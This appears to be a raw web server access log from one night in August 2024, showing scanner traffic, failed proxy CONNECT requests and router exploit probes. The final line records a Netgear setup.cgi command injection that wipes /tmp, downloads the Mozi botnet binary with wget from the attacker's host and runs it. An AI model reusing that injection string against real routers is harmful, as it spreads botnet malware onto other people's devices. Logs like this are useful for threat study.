45.79.181.179 - - [10/Aug/2024:00:04:56 +0330] "GET / HTTP/1.1" 200 6040
154.213.184.25 - - [10/Aug/2024:00:23:56 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
12.36.54.51 - - [10/Aug/2024:00:28:11 +0330] "GET / HTTP/1.0" 200 6041
91.92.251.254 - - [10/Aug/2024:00:39:52 +0330] "CONNECT 45.61.136.175:7227 HTTP/1.1" 400 811
209.141.51.21 - - [10/Aug/2024:01:01:43 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 404 797
167.94.146.57 - - [10/Aug/2024:01:07:23 +0330] "GET / HTTP/1.1" 200 6040
167.94.146.57 - - [10/Aug/2024:01:07:26 +0330] "GET / HTTP/1.1" 200 6041
167.94.146.57 - - [10/Aug/2024:01:07:26 +0330] "GET /favicon.ico HTTP/1.1" 404 778
154.213.184.25 - - [10/Aug/2024:01:16:19 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
154.213.187.96 - - [10/Aug/2024:01:34:06 +0330] "GET null HTTP/1.1" 400 2447
104.206.128.62 - - [10/Aug/2024:02:00:09 +0330] "GET / HTTP/1.1" 200 6040
112.46.214.107 - - [10/Aug/2024:02:06:17 +0330] "GET / HTTP/1.1" 400 778
209.141.51.21 - - [10/Aug/2024:02:27:36 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 404 797
193.177.182.119 - - [10/Aug/2024:02:29:21 +0330] "GET / HTTP/1.1" 200 6039
104.140.188.34 - - [10/Aug/2024:02:44:44 +0330] "GET / HTTP/1.0" 200 6040
154.213.184.25 - - [10/Aug/2024:03:06:19 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
154.213.184.18 - - [10/Aug/2024:03:18:58 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
78.108.177.51 - - [10/Aug/2024:03:21:33 +0330] "GET / HTTP/1.0" 200 6039
27.215.212.169 - - [10/Aug/2024:04:49:41 +0330] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.215.212.169:35417/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 776
